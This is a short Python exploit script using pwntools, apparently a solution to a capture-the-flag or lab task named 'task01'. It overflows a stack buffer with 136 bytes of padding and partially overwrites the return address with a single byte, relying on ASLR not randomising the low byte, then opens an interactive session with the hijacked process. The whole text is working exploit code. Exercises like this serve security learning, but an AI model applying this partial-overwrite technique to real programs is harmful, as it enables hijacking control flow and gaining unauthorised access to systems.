from pwn import *
from ctypes import *

io = process("./task01")
io.recvuntil(b'What is your name?')

junk_length = 128 + 8
junk = bytes('a' * junk_length, 'utf-8')

# ASLR doesn't seem to randomize the last byte. If that is true, this should work with 100% chance.
least_significant_byte_of_ret = b'\x40'
input = junk + least_significant_byte_of_ret

# gdb.attach(io)
io.send(input)
io.interactive()
